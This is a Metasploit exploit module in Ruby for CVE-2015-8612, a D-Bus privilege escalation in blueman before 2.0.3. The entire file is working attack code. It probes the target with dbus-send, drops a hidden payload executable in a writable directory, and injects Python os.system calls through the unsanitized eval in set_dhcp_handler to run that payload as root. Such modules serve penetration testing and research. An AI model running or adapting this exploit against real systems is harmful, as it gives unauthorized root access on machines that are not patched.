# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;blueman set_dhcp_handler D-Bus Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module attempts to gain root privileges by exploiting a Python
        code injection vulnerability in blueman versions prior to 2.0.3.

        The `org.blueman.Mechanism.EnableNetwork` D-Bus interface exposes the
        `set_dhcp_handler` function which uses user input in a call to `eval`,
        without sanitization, resulting in arbitrary code execution as root.

        This module has been tested successfully with blueman version 1.23
        on Debian 8 Jessie (x64).
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;the grugq&#039;, # Discovery and exploit
          &#039;bcoles&#039;     # Metasploit
        ],
      &#039;DisclosureDate&#039; => &#039;2015-12-18&#039;,
      &#039;References&#039;     =>
        [
          [&#039;BID&#039;, &#039;79688&#039;],
          [&#039;CVE&#039;, &#039;2015-8612&#039;],
          [&#039;URL&#039;, &#039;https://twitter.com/thegrugq/status/677809527882813440&#039;],
          [&#039;URL&#039;, &#039;https://github.com/blueman-project/blueman/issues/416&#039;],
          [&#039;URL&#039;, &#039;https://www.openwall.com/lists/oss-security/2015/12/18/6&#039;],
          [&#039;URL&#039;, &#039;https://www.debian.org/security/2015/dsa-3427&#039;],
          [&#039;URL&#039;, &#039;https://bugs.mageia.org/show_bug.cgi?id=17361&#039;],
          [&#039;URL&#039;, &#039;http://www.slackware.com/security/viewer.php?l=slackware-security&y=2015&m=slackware-security.421085&#039;]
        ],
      &#039;Platform&#039;       => [&#039;linux&#039;],
      &#039;Arch&#039;           =>
        [
          ARCH_X86,
          ARCH_X64,
          ARCH_ARMLE,
          ARCH_AARCH64,
          ARCH_PPC,
          ARCH_MIPSLE,
          ARCH_MIPSBE
        ],
      &#039;Targets&#039;        => [[&#039;Auto&#039;, {}]],
      &#039;DefaultTarget&#039;  => 0))
    register_advanced_options [
      OptBool.new(&#039;ForceExploit&#039;, [false, &#039;Override check result&#039;, false]),
      OptString.new(&#039;WritableDir&#039;, [true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039;])
    ]
  end

  def base_dir
    datastore[&#039;WritableDir&#039;].to_s
  end

  def upload(path, data)
    print_status "Writing &#039;#{path}&#039; (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    register_file_for_cleanup path
  end

  def upload_and_chmodx(path, data)
    upload path, data
    chmod path
  end

  def dbus_send(dest:, type:, path:, interface:, contents:)
    cmd_exec "dbus-send --system --print-reply --dest=#{dest} --type=#{type} #{path} #{interface} #{contents}"
  end

  def check
    unless command_exists? &#039;dbus-send&#039;
      vprint_error &#039;dbus-send is not installed. Exploitation will fail.&#039;
      return CheckCode::Safe
    end
    vprint_good &#039;dbus-send is installed&#039;

    res = dbus_send(
      dest: &#039;org.blueman.Mechanism&#039;,
      type: &#039;method_call&#039;,
      path: &#039;/&#039;,
      interface: &#039;org.freedesktop.DBus.Introspectable.Introspect&#039;,
      contents: &#039;&#039;
    )

    unless res.include? &#039;EnableNetwork&#039;
      vprint_error &#039;org.blueman.Mechanism.EnableNetwork D-Bus interface is not available&#039;
      return CheckCode::Safe
    end
    vprint_good &#039;org.blueman.Mechanism.EnableNetwork D-Bus interface is available&#039;

    res = execute_python(&#039;&#039;)
    unless res.include? &#039;eval("nc.set_dhcp_handler(%s)" % dhcp_handler)&#039;
      vprint_error &#039;Target is not vulnerable&#039;
      return CheckCode::Safe
    end

    CheckCode::Vulnerable
  end

  def execute_python(code)
    dbus_send(
      dest: &#039;org.blueman.Mechanism&#039;,
      type: &#039;method_call&#039;,
      path: &#039;/&#039;,
      interface: &#039;org.blueman.Mechanism.EnableNetwork&#039;,
      contents: "&#039;string:[]&#039; &#039;string:[]&#039; &#039;string:#{code}&#039;"
    )
  end

  def exploit
    unless check == CheckCode::Vulnerable
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    if is_root?
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::BadConfig, &#039;Session already has root privileges. Set ForceExploit to override.&#039;
      end
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    payload_name = ".#{rand_text_alphanumeric 10..15}"
    payload_path = "#{base_dir}/#{payload_name}"
    upload_and_chmodx payload_path, generate_payload_exe

    print_status &#039;Executing payload...&#039;
    res = execute_python "os.system(\"#{payload_path}&\")"
    vprint_line res

    unless res.include? &#039;eval("nc.set_dhcp_handler(%s)" % dhcp_handler)&#039;
      fail_with Failure::NotVulnerable, &#039;The target is not vulnerable&#039;
    end

    if res.include? &#039;SyntaxError:&#039;
      fail_with Failure::Unknown, &#039;Payload execution failed due to syntax error&#039;
    end
  end
end

